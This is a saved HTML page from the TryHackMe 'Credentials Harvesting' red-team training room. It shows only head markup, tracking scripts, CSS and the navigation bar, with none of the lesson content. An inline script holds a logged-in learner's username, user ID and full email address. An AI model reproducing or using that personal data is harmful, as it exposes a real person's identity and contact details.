<!DOCTYPE html>
<!-- saved from url=(0041)https://tryhackme.com/room/credharvesting -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>TryHackMe | Credentials Harvesting</title>
<meta name="description" content="Apply current authentication models employed in modern environments to a red team approach.">
<meta name="og:description" content="Apply current authentication models employed in modern environments to a red team approach.">
<meta name="keywords" content="cyber,security,cyber security,cyber security training,coding,computer,bitcoin,hacking,hackers,hacks,hack,exploits,keylogger,learn,poc">


<meta property="og:site_name" content="TryHackMe">
<meta property="og:title" content="TryHackMe | Credentials Harvesting">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/room-icons/1ab32f03262d2277c032ea836ef83bed.png">
<meta property="og:url" content="https://tryhackme.com/room/credharvesting">
<meta name="twitter:image" content="https://tryhackme.com/img/meta/default.png">
<meta property="og:description" content="Apply current authentication models employed in modern environments to a red team approach.">

<script type="text/javascript" async="" src="./TryHackMe _ Credentials Harvesting_files/pgpbhph6"></script><script src="./TryHackMe _ Credentials Harvesting_files/jquery.min.js"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/popper.min.js"></script>
<link rel="stylesheet" href="./TryHackMe _ Credentials Harvesting_files/boostrap431.min.css">
<script src="./TryHackMe _ Credentials Harvesting_files/bootstrap431.min.js"></script>
<link rel="stylesheet" href="./TryHackMe _ Credentials Harvesting_files/animate.min.css">
<link rel="stylesheet" href="./TryHackMe _ Credentials Harvesting_files/all.css" integrity="sha384-ekOryaXPbeCpWQNxMwSWVvQ0+1VrStoPJq54shlYhR8HzQgig1v5fas6YgOqLoKz" crossorigin="anonymous">
<link rel="icon" type="image/png" href="https://assets.tryhackme.com/img/favicon.png">
<link rel="stylesheet" media="screen" href="./TryHackMe _ Credentials Harvesting_files/general-style.css">
<script src="./TryHackMe _ Credentials Harvesting_files/script.js"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/validation.js"></script>

<link rel="stylesheet" type="text/css" href="./TryHackMe _ Credentials Harvesting_files/cookieconsent.min.css">
<script src="./TryHackMe _ Credentials Harvesting_files/cookieconsent.min.js"></script>
<script async="" src="./TryHackMe _ Credentials Harvesting_files/js"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
  
    gtag('config', 'G-Z8D4WL3D4P');
  </script>


<script>
    window.intercomSettings = {
      api_base: "https://api-iam.intercom.io",
      app_id: "pgpbhph6"
    };
  </script>
<script>
    (function (h, o, t, j, a, r) {
      h.hj = h.hj || function () { (h.hj.q = h.hj.q || []).push(arguments) };
      h._hjSettings = { hjid: 1950941, hjsv: 6 };
      a = o.getElementsByTagName('head')[0];
      r = o.createElement('script'); r.async = 1;
      r.src = t + h._hjSettings.hjid + j + h._hjSettings.hjsv;
      a.appendChild(r);
    })(window, document, 'https://static.hotjar.com/c/hotjar-', '.js?sv=');
  </script><script async="" src="./TryHackMe _ Credentials Harvesting_files/hotjar-1950941.js"></script>
<script>
    /* Global javascript variables */

    // Used inside script.js for createRooms compelted users.
    const username = 'Silv3rsurf3r'
    const subscribed = '1'
    const level = '10'
    const intercomEnabled = 'true'
  </script>
<script>
    //add back tracking info
    const userId = "63d14e7f857ae10041bb192f"
    let tutorialComplete = false
    if ('false' == "true") {
      tutorialComplete = true
    }
    if(intercomEnabled === "true"){
      window.intercomSettings = {
        api_base: "https://api-iam.intercom.io",
        app_id: "pgpbhph6",
        user_id: userId,
        username: username,
        email: "giftonpaul@karunya.edu.in",
        created_at: Math.floor(new Date("Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)").getTime() / 1000) // Signup date as a Unix timestamp
      };
    }
    window.hj('identify', userId, {
      displayName: username,
      subscribed: "1",
      dateSignUp: "Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)",
      experience: "advanced"
    })
  </script>
<script type="application/ld+json">

   {
      "@context":"https://schema.org",
      "@type":"Organization",
      "url":"https://tryhackme.com",
      "name":"TryHackMe",
      "logo":"https://tryhackme.com/img/favicon.png",
      "description":"TryHackMe is a free online platform for learning cyber security, using hands-on exercises and labs, all through your browser!",
      "email": "support@tryhackme.com",
      "sameAs":[
         "https://www.linkedin.com/company/tryhackme",
         "https://twitter.com/realtryhackme"
      ]
   }

</script>
<script>
    console.log(`%c
      ------------------
      < Happy Hacking! >
      ------------------
              \\   ^__^
               \\  (oo)\\_______
                  (__)\\       )\\/\\
                      ||----w |
                      ||     ||`, "font-family:monospace")
  </script>
<script>
  (function(){var w=window;var ic=w.Intercom;if(typeof ic==="function"){ic('reattach_activator');ic('update',w.intercomSettings);}else{var d=document;var i=function(){i.c(arguments);};i.q=[];i.c=function(args){i.q.push(args);};w.Intercom=i;var l=function(){var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://widget.intercom.io/widget/pgpbhph6';var x=d.getElementsByTagName('script')[0];x.parentNode.insertBefore(s,x);};if(document.readyState==='complete'){l();}else if(w.attachEvent){w.attachEvent('onload',l);}else{w.addEventListener('load',l,false);}}})();
</script>
<script src="./TryHackMe _ Credentials Harvesting_files/socket.io.js"></script><script>
  let socket = io.connect({
    transports: ['websocket'],
    reconnection: true,
    reconnectionDelay: 1000,
    reconnectionAttempts: 10
  })
</script><style type="text/css">.apexcharts-canvas {
  position: relative;
  user-select: none;
  /* cannot give overflow: hidden as it will crop tooltips which overflow outside chart area */
}


/* scrollbar is not visible by default for legend, hence forcing the visibility */
.apexcharts-canvas ::-webkit-scrollbar {
  -webkit-appearance: none;
  width: 6px;
}

.apexcharts-canvas ::-webkit-scrollbar-thumb {
  border-radius: 4px;
  background-color: rgba(0, 0, 0, .5);
  box-shadow: 0 0 1px rgba(255, 255, 255, .5);
  -webkit-box-shadow: 0 0 1px rgba(255, 255, 255, .5);
}


.apexcharts-inner {
  position: relative;
}

.apexcharts-text tspan {
  font-family: inherit;
}

.legend-mouseover-inactive {
  transition: 0.15s ease all;
  opacity: 0.20;
}

.apexcharts-series-collapsed {
  opacity: 0;
}

.apexcharts-tooltip {
  border-radius: 5px;
  box-shadow: 2px 2px 6px -4px #999;
  cursor: default;
  font-size: 14px;
  left: 62px;
  opacity: 0;
  pointer-events: none;
  position: absolute;
  top: 20px;
  display: flex;
  flex-direction: column;
  overflow: hidden;
  white-space: nowrap;
  z-index: 12;
  transition: 0.15s ease all;
}

.apexcharts-tooltip.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-tooltip.apexcharts-theme-light {
  border: 1px solid #e3e3e3;
  background: rgba(255, 255, 255, 0.96);
}

.apexcharts-tooltip.apexcharts-theme-dark {
  color: #fff;
  background: rgba(30, 30, 30, 0.8);
}

.apexcharts-tooltip * {
  font-family: inherit;
}


.apexcharts-tooltip-title {
  padding: 6px;
  font-size: 15px;
  margin-bottom: 4px;
}

.apexcharts-tooltip.apexcharts-theme-light .apexcharts-tooltip-title {
  background: #ECEFF1;
  border-bottom: 1px solid #ddd;
}

.apexcharts-tooltip.apexcharts-theme-dark .apexcharts-tooltip-title {
  background: rgba(0, 0, 0, 0.7);
  border-bottom: 1px solid #333;
}

.apexcharts-tooltip-text-y-value,
.apexcharts-tooltip-text-goals-value,
.apexcharts-tooltip-text-z-value {
  display: inline-block;
  font-weight: 600;
  margin-left: 5px;
}

.apexcharts-tooltip-text-y-label:empty,
.apexcharts-tooltip-text-y-value:empty,
.apexcharts-tooltip-text-goals-label:empty,
.apexcharts-tooltip-text-goals-value:empty,
.apexcharts-tooltip-text-z-value:empty {
  display: none;
}

.apexcharts-tooltip-text-y-value,
.apexcharts-tooltip-text-goals-value,
.apexcharts-tooltip-text-z-value {
  font-weight: 600;
}

.apexcharts-tooltip-text-goals-label, 
.apexcharts-tooltip-text-goals-value {
  padding: 6px 0 5px;
}

.apexcharts-tooltip-goals-group, 
.apexcharts-tooltip-text-goals-label, 
.apexcharts-tooltip-text-goals-value {
  display: flex;
}
.apexcharts-tooltip-text-goals-label:not(:empty),
.apexcharts-tooltip-text-goals-value:not(:empty) {
  margin-top: -6px;
}

.apexcharts-tooltip-marker {
  width: 12px;
  height: 12px;
  position: relative;
  top: 0px;
  margin-right: 10px;
  border-radius: 50%;
}

.apexcharts-tooltip-series-group {
  padding: 0 10px;
  display: none;
  text-align: left;
  justify-content: left;
  align-items: center;
}

.apexcharts-tooltip-series-group.apexcharts-active .apexcharts-tooltip-marker {
  opacity: 1;
}

.apexcharts-tooltip-series-group.apexcharts-active,
.apexcharts-tooltip-series-group:last-child {
  padding-bottom: 4px;
}

.apexcharts-tooltip-series-group-hidden {
  opacity: 0;
  height: 0;
  line-height: 0;
  padding: 0 !important;
}

.apexcharts-tooltip-y-group {
  padding: 6px 0 5px;
}

.apexcharts-tooltip-box, .apexcharts-custom-tooltip {
  padding: 4px 8px;
}

.apexcharts-tooltip-boxPlot {
  display: flex;
  flex-direction: column-reverse;
}

.apexcharts-tooltip-box>div {
  margin: 4px 0;
}

.apexcharts-tooltip-box span.value {
  font-weight: bold;
}

.apexcharts-tooltip-rangebar {
  padding: 5px 8px;
}

.apexcharts-tooltip-rangebar .category {
  font-weight: 600;
  color: #777;
}

.apexcharts-tooltip-rangebar .series-name {
  font-weight: bold;
  display: block;
  margin-bottom: 5px;
}

.apexcharts-xaxistooltip {
  opacity: 0;
  padding: 9px 10px;
  pointer-events: none;
  color: #373d3f;
  font-size: 13px;
  text-align: center;
  border-radius: 2px;
  position: absolute;
  z-index: 10;
  background: #ECEFF1;
  border: 1px solid #90A4AE;
  transition: 0.15s ease all;
}

.apexcharts-xaxistooltip.apexcharts-theme-dark {
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid rgba(0, 0, 0, 0.5);
  color: #fff;
}

.apexcharts-xaxistooltip:after,
.apexcharts-xaxistooltip:before {
  left: 50%;
  border: solid transparent;
  content: " ";
  height: 0;
  width: 0;
  position: absolute;
  pointer-events: none;
}

.apexcharts-xaxistooltip:after {
  border-color: rgba(236, 239, 241, 0);
  border-width: 6px;
  margin-left: -6px;
}

.apexcharts-xaxistooltip:before {
  border-color: rgba(144, 164, 174, 0);
  border-width: 7px;
  margin-left: -7px;
}

.apexcharts-xaxistooltip-bottom:after,
.apexcharts-xaxistooltip-bottom:before {
  bottom: 100%;
}

.apexcharts-xaxistooltip-top:after,
.apexcharts-xaxistooltip-top:before {
  top: 100%;
}

.apexcharts-xaxistooltip-bottom:after {
  border-bottom-color: #ECEFF1;
}

.apexcharts-xaxistooltip-bottom:before {
  border-bottom-color: #90A4AE;
}

.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:after {
  border-bottom-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:before {
  border-bottom-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-top:after {
  border-top-color: #ECEFF1
}

.apexcharts-xaxistooltip-top:before {
  border-top-color: #90A4AE;
}

.apexcharts-xaxistooltip-top.apexcharts-theme-dark:after {
  border-top-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-top.apexcharts-theme-dark:before {
  border-top-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-yaxistooltip {
  opacity: 0;
  padding: 4px 10px;
  pointer-events: none;
  color: #373d3f;
  font-size: 13px;
  text-align: center;
  border-radius: 2px;
  position: absolute;
  z-index: 10;
  background: #ECEFF1;
  border: 1px solid #90A4AE;
}

.apexcharts-yaxistooltip.apexcharts-theme-dark {
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid rgba(0, 0, 0, 0.5);
  color: #fff;
}

.apexcharts-yaxistooltip:after,
.apexcharts-yaxistooltip:before {
  top: 50%;
  border: solid transparent;
  content: " ";
  height: 0;
  width: 0;
  position: absolute;
  pointer-events: none;
}

.apexcharts-yaxistooltip:after {
  border-color: rgba(236, 239, 241, 0);
  border-width: 6px;
  margin-top: -6px;
}

.apexcharts-yaxistooltip:before {
  border-color: rgba(144, 164, 174, 0);
  border-width: 7px;
  margin-top: -7px;
}

.apexcharts-yaxistooltip-left:after,
.apexcharts-yaxistooltip-left:before {
  left: 100%;
}

.apexcharts-yaxistooltip-right:after,
.apexcharts-yaxistooltip-right:before {
  right: 100%;
}

.apexcharts-yaxistooltip-left:after {
  border-left-color: #ECEFF1;
}

.apexcharts-yaxistooltip-left:before {
  border-left-color: #90A4AE;
}

.apexcharts-yaxistooltip-left.apexcharts-theme-dark:after {
  border-left-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-left.apexcharts-theme-dark:before {
  border-left-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-right:after {
  border-right-color: #ECEFF1;
}

.apexcharts-yaxistooltip-right:before {
  border-right-color: #90A4AE;
}

.apexcharts-yaxistooltip-right.apexcharts-theme-dark:after {
  border-right-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-right.apexcharts-theme-dark:before {
  border-right-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip.apexcharts-active {
  opacity: 1;
}

.apexcharts-yaxistooltip-hidden {
  display: none;
}

.apexcharts-xcrosshairs,
.apexcharts-ycrosshairs {
  pointer-events: none;
  opacity: 0;
  transition: 0.15s ease all;
}

.apexcharts-xcrosshairs.apexcharts-active,
.apexcharts-ycrosshairs.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-ycrosshairs-hidden {
  opacity: 0;
}

.apexcharts-selection-rect {
  cursor: move;
}

.svg_select_boundingRect, .svg_select_points_rot {
  pointer-events: none;
  opacity: 0;
  visibility: hidden;
}
.apexcharts-selection-rect + g .svg_select_boundingRect,
.apexcharts-selection-rect + g .svg_select_points_rot {
  opacity: 0;
  visibility: hidden;
}

.apexcharts-selection-rect + g .svg_select_points_l,
.apexcharts-selection-rect + g .svg_select_points_r {
  cursor: ew-resize;
  opacity: 1;
  visibility: visible;
}

.svg_select_points {
  fill: #efefef;
  stroke: #333;
  rx: 2;
}

.apexcharts-svg.apexcharts-zoomable.hovering-zoom {
  cursor: crosshair
}

.apexcharts-svg.apexcharts-zoomable.hovering-pan {
  cursor: move
}

.apexcharts-zoom-icon,
.apexcharts-zoomin-icon,
.apexcharts-zoomout-icon,
.apexcharts-reset-icon,
.apexcharts-pan-icon,
.apexcharts-selection-icon,
.apexcharts-menu-icon,
.apexcharts-toolbar-custom-icon {
  cursor: pointer;
  width: 20px;
  height: 20px;
  line-height: 24px;
  color: #6E8192;
  text-align: center;
}

.apexcharts-zoom-icon svg,
.apexcharts-zoomin-icon svg,
.apexcharts-zoomout-icon svg,
.apexcharts-reset-icon svg,
.apexcharts-menu-icon svg {
  fill: #6E8192;
}

.apexcharts-selection-icon svg {
  fill: #444;
  transform: scale(0.76)
}

.apexcharts-theme-dark .apexcharts-zoom-icon svg,
.apexcharts-theme-dark .apexcharts-zoomin-icon svg,
.apexcharts-theme-dark .apexcharts-zoomout-icon svg,
.apexcharts-theme-dark .apexcharts-reset-icon svg,
.apexcharts-theme-dark .apexcharts-pan-icon svg,
.apexcharts-theme-dark .apexcharts-selection-icon svg,
.apexcharts-theme-dark .apexcharts-menu-icon svg,
.apexcharts-theme-dark .apexcharts-toolbar-custom-icon svg {
  fill: #f3f4f5;
}

.apexcharts-canvas .apexcharts-zoom-icon.apexcharts-selected svg,
.apexcharts-canvas .apexcharts-selection-icon.apexcharts-selected svg,
.apexcharts-canvas .apexcharts-reset-zoom-icon.apexcharts-selected svg {
  fill: #008FFB;
}

.apexcharts-theme-light .apexcharts-selection-icon:not(.apexcharts-selected):hover svg,
.apexcharts-theme-light .apexcharts-zoom-icon:not(.apexcharts-selected):hover svg,
.apexcharts-theme-light .apexcharts-zoomin-icon:hover svg,
.apexcharts-theme-light .apexcharts-zoomout-icon:hover svg,
.apexcharts-theme-light .apexcharts-reset-icon:hover svg,
.apexcharts-theme-light .apexcharts-menu-icon:hover svg {
  fill: #333;
}

.apexcharts-selection-icon,
.apexcharts-menu-icon {
  position: relative;
}

.apexcharts-reset-icon {
  margin-left: 5px;
}

.apexcharts-zoom-icon,
.apexcharts-reset-icon,
.apexcharts-menu-icon {
  transform: scale(0.85);
}

.apexcharts-zoomin-icon,
.apexcharts-zoomout-icon {
  transform: scale(0.7)
}

.apexcharts-zoomout-icon {
  margin-right: 3px;
}

.apexcharts-pan-icon {
  transform: scale(0.62);
  position: relative;
  left: 1px;
  top: 0px;
}

.apexcharts-pan-icon svg {
  fill: #fff;
  stroke: #6E8192;
  stroke-width: 2;
}

.apexcharts-pan-icon.apexcharts-selected svg {
  stroke: #008FFB;
}

.apexcharts-pan-icon:not(.apexcharts-selected):hover svg {
  stroke: #333;
}

.apexcharts-toolbar {
  position: absolute;
  z-index: 11;
  max-width: 176px;
  text-align: right;
  border-radius: 3px;
  padding: 0px 6px 2px 6px;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.apexcharts-menu {
  background: #fff;
  position: absolute;
  top: 100%;
  border: 1px solid #ddd;
  border-radius: 3px;
  padding: 3px;
  right: 10px;
  opacity: 0;
  min-width: 110px;
  transition: 0.15s ease all;
  pointer-events: none;
}

.apexcharts-menu.apexcharts-menu-open {
  opacity: 1;
  pointer-events: all;
  transition: 0.15s ease all;
}

.apexcharts-menu-item {
  padding: 6px 7px;
  font-size: 12px;
  cursor: pointer;
}

.apexcharts-theme-light .apexcharts-menu-item:hover {
  background: #eee;
}

.apexcharts-theme-dark .apexcharts-menu {
  background: rgba(0, 0, 0, 0.7);
  color: #fff;
}

@media screen and (min-width: 768px) {
  .apexcharts-canvas:hover .apexcharts-toolbar {
    opacity: 1;
  }
}

.apexcharts-datalabel.apexcharts-element-hidden {
  opacity: 0;
}

.apexcharts-pie-label,
.apexcharts-datalabels,
.apexcharts-datalabel,
.apexcharts-datalabel-label,
.apexcharts-datalabel-value {
  cursor: default;
  pointer-events: none;
}

.apexcharts-pie-label-delay {
  opacity: 0;
  animation-name: opaque;
  animation-duration: 0.3s;
  animation-fill-mode: forwards;
  animation-timing-function: ease;
}

.apexcharts-canvas .apexcharts-element-hidden {
  opacity: 0;
}

.apexcharts-hide .apexcharts-series-points {
  opacity: 0;
}

.apexcharts-gridline,
.apexcharts-annotation-rect,
.apexcharts-tooltip .apexcharts-marker,
.apexcharts-area-series .apexcharts-area,
.apexcharts-line,
.apexcharts-zoom-rect,
.apexcharts-toolbar svg,
.apexcharts-area-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
.apexcharts-line-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
.apexcharts-radar-series path,
.apexcharts-radar-series polygon {
  pointer-events: none;
}


/* markers */

.apexcharts-marker {
  transition: 0.15s ease all;
}

@keyframes opaque {
  0% {
    opacity: 0;
  }
  100% {
    opacity: 1;
  }
}


/* Resize generated styles */

@keyframes resizeanim {
  from {
    opacity: 0;
  }
  to {
    opacity: 0;
  }
}

.resize-triggers {
  animation: 1ms resizeanim;
  visibility: hidden;
  opacity: 0;
}

.resize-triggers,
.resize-triggers>div,
.contract-trigger:before {
  content: " ";
  display: block;
  position: absolute;
  top: 0;
  left: 0;
  height: 100%;
  width: 100%;
  overflow: hidden;
}

.resize-triggers>div {
  background: #eee;
  overflow: auto;
}

.contract-trigger:before {
  width: 200%;
  height: 200%;
}</style><script async="" src="./TryHackMe _ Credentials Harvesting_files/modules.5957fbf26d1b525b5a12.js" charset="utf-8"></script><style data-jss="" data-meta="MuiDialog">
@media print {
  .MuiDialog-root {
    position: absolute !important;
  }
}
.MuiDialog-scrollPaper {
  display: flex;
  align-items: center;
  justify-content: center;
}
.MuiDialog-scrollBody {
  overflow-x: hidden;
  overflow-y: auto;
  text-align: center;
}
.MuiDialog-scrollBody:after {
  width: 0;
  height: 100%;
  content: "";
  display: inline-block;
  vertical-align: middle;
}
.MuiDialog-container {
  height: 100%;
  outline: 0;
}
@media print {
  .MuiDialog-container {
    height: auto;
  }
}
.MuiDialog-paper {
  margin: 32px;
  position: relative;
  overflow-y: auto;
}
@media print {
  .MuiDialog-paper {
    box-shadow: none;
    overflow-y: visible;
  }
}
.MuiDialog-paperScrollPaper {
  display: flex;
  max-height: calc(100% - 64px);
  flex-direction: column;
}
.MuiDialog-paperScrollBody {
  display: inline-block;
  text-align: left;
  vertical-align: middle;
}
.MuiDialog-paperWidthFalse {
  max-width: calc(100% - 64px);
}
.MuiDialog-paperWidthXs {
  max-width: 444px;
}
@media (max-width:507.95px) {
  .MuiDialog-paperWidthXs.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthSm {
  max-width: 600px;
}
@media (max-width:663.95px) {
  .MuiDialog-paperWidthSm.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthMd {
  max-width: 960px;
}
@media (max-width:1023.95px) {
  .MuiDialog-paperWidthMd.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthLg {
  max-width: 1280px;
}
@media (max-width:1343.95px) {
  .MuiDialog-paperWidthLg.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthXl {
  max-width: 1920px;
}
@media (max-width:1983.95px) {
  .MuiDialog-paperWidthXl.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperFullWidth {
  width: calc(100% - 64px);
}
.MuiDialog-paperFullScreen {
  width: 100%;
  height: 100%;
  margin: 0;
  max-width: 100%;
  max-height: none;
  border-radius: 0;
}
.MuiDialog-paperFullScreen.MuiDialog-paperScrollBody {
  margin: 0;
  max-width: 100%;
}
</style><style></style><style type="text/css" name="pf-style">body, body * { z-index: 0 !important; }html, body {overflow: hidden !important;height: 100% !important;margin: 0 !important;position: static !important;margin: 0px !important;padding: 0px !important;overflow: hidden !important;}</style><meta name="viewport" content="width=device-width, initial-scale=1"></head>


<body><div role="dialog" aria-live="polite" aria-label="cookieconsent" aria-describedby="cookieconsent:desc" class="cc-window cc-floating cc-type-info cc-theme-classic cc-bottom cc-right cc-color-override-382972913 cc-invisible hidden-originally" style="display: none;" data-pf_style_display="none" data-pf_style_visibility="visible"><!--googleoff: all--><span id="cookieconsent:desc" class="cc-message hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">We use cookies to ensure you get the best user experience. For more information contact us. <a aria-label="learn more about cookies" role="button" tabindex="0" class="cc-link hidden-originally" href="https://tryhackme.com/legal/terms-of-use" target="_blank" data-pf_style_display="none" data-pf_style_visibility="hidden">Read more</a></span><div class="cc-compliance hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><a aria-label="dismiss cookie message" role="button" tabindex="0" class="cc-btn cc-dismiss hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Got it!</a></div><!--googleon: all--></div>
<link href="./TryHackMe _ Credentials Harvesting_files/scoreboard.css" rel="stylesheet" type="text/css" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
<link href="./TryHackMe _ Credentials Harvesting_files/introjs.css" rel="stylesheet" type="text/css" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
<link href="./TryHackMe _ Credentials Harvesting_files/slideout.css" rel="stylesheet" type="text/css" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
<link href="./TryHackMe _ Credentials Harvesting_files/public-rooms.css" rel="stylesheet" type="text/css" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
<link href="./TryHackMe _ Credentials Harvesting_files/asciinema-player.css" rel="stylesheet" type="text/css" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"> 
<link href="./TryHackMe _ Credentials Harvesting_files/prism.css" rel="stylesheet" type="text/css" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"> 
<link href="./TryHackMe _ Credentials Harvesting_files/magnific-popup.css" rel="stylesheet" type="text/css" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"> 
<script src="./TryHackMe _ Credentials Harvesting_files/lottie-player.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>

<div id="room-content" data-pf_style_display="block" data-pf_style_visibility="visible">
<div id="room-content-main" data-pf_style_display="block" data-pf_style_visibility="visible">
<nav class="navbar navbar-expand-md navbar-dark navbar-color-loggedin navbar-main" data-pf_style_display="flex" data-pf_style_visibility="visible">
<div class="container" data-pf_style_display="flex" data-pf_style_visibility="visible">
<button id="thm-mobile-nav-open" class="thm-nav__hamburger-btn hidden-originally" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Open mobile navigation" data-pf_style_display="none" data-pf_style_visibility="visible">
<span class="thm-nav__hamburger-lines hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></span>
</button>
<div class="collapse navbar-collapse justify-content-end" id="navbarSupportedContent" data-pf_style_display="flex" data-pf_style_visibility="visible">
<div class="navbar-brand" href="/" data-pf_style_display="block" data-pf_style_visibility="visible">
<a href="https://tryhackme.com/dashboard" data-pf_style_display="inline" data-pf_style_visibility="visible">
<img width="115px" src="./TryHackMe _ Credentials Harvesting_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="115" data-pf_rect_height="64.65625">
</a>
</div>
<ul class="navbar-nav mr-auto mt-2 mt-lg-0 navbar-pagelinks" data-pf_style_display="flex" data-pf_style_visibility="visible">
<li class="nav-item " data-pf_style_display="list-item" data-pf_style_visibility="visible">
<a class="nav-link" href="https://tryhackme.com/dashboard" data-pf_style_display="block" data-pf_style_visibility="visible">
<i class="navbar-item-icon far fa-browser" data-pf_style_display="block" data-pf_style_visibility="visible"></i>
<div class="navbar-item-text" data-pf_style_display="block" data-pf_style_visibility="visible">Dashboard</div>
</a>
</li>
<li class="nav-item active" id="nav-learn" data-pf_style_display="list-item" data-pf_style_visibility="visible">
<a class="nav-link" href="https://tryhackme.com/hacktivities" data-pf_style_display="block" data-pf_style_visibility="visible">
<i class="navbar-item-icon far fa-book-open" data-pf_style_display="block" data-pf_style_visibility="visible"></i>
<div class="navbar-item-text" data-pf_style_display="block" data-pf_style_visibility="visible">Learn</div>
</a>
</li>
<li class="nav-item  dropdown lite-removable" data-pf_style_display="list-item" data-pf_style_visibility="visible">
<a id="nav-other" class="nav-link" href="https://tryhackme.com/room/credharvesting#" data-toggle="dropdown" data-pf_style_display="block" data-pf_style_visibility="visible">
<i class="navbar-item-icon far fa-trophy" data-pf_style_display="block" data-pf_style_visibility="visible"></i>
<div class="navbar-item-text" data-pf_style_display="block" data-pf_style_visibility="visible">Compete</div>
</a>
<div class="dropdown-menu hidden-originally" aria-labelledby="navbarDropdown" data-pf_style_display="none" data-pf_style_visibility="visible">
<a class="dropdown-item d-flex vertical-align-custom hidden-originally" href="https://tryhackme.com/leaderboards" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="dropdown-menu-icon hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="fas fa-trophy hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</div>
<div class="dropdown-menu-desc hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span class="mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Leaderboards</span>
<div class="text-lgray size-12 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Platform Rankings</div>
</div>
</a>
<a class="dropdown-item d-flex vertical-align-custom hidden-originally" href="https://tryhackme.com/games/koth" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="dropdown-menu-icon hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="fas fa-crown hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</div>
<div class="dropdown-menu-desc hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span class="mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">King of the Hill</span>
<div class="text-lgray size-12 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Attack &amp; Defend</div>
</div>
</a>
<a class="dropdown-item d-flex vertical-align-custom hidden-originally" href="https://tryhackme.com/workspace" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="dropdown-menu-icon hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="fas fa-user-friends hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</div>
<div class="dropdown-menu-desc hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span class="mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Workspace</span>
<div class="text-lgray size-12 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Compete &amp; Collaborate</div>
</div>
</a>
</div>
</li>
<li class="nav-item dropdown" data-pf_style_display="list-item" data-pf_style_visibility="visible">
<a data-cy="nav-other-menu-button" id="nav-other" class="nav-link" href="https://tryhackme.com/room/credharvesting#" data-toggle="dropdown" data-pf_style_display="block" data-pf_style_visibility="visible">
<i class="navbar-item-icon far fa-ellipsis-h-alt" data-pf_style_display="block" data-pf_style_visibility="visible"></i>
<div class="navbar-item-text" data-pf_style_display="block" data-pf_style_visibility="visible">Other</div>
</a>
<div data-cy="nav-other-menu" class="dropdown-menu dropdown-menu-center large-dropdown hidden-originally" aria-labelledby="navbarDropdown" data-pf_style_display="none" data-pf_style_visibility="visible">
<span class="dropdown-menu-arrow hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></span>
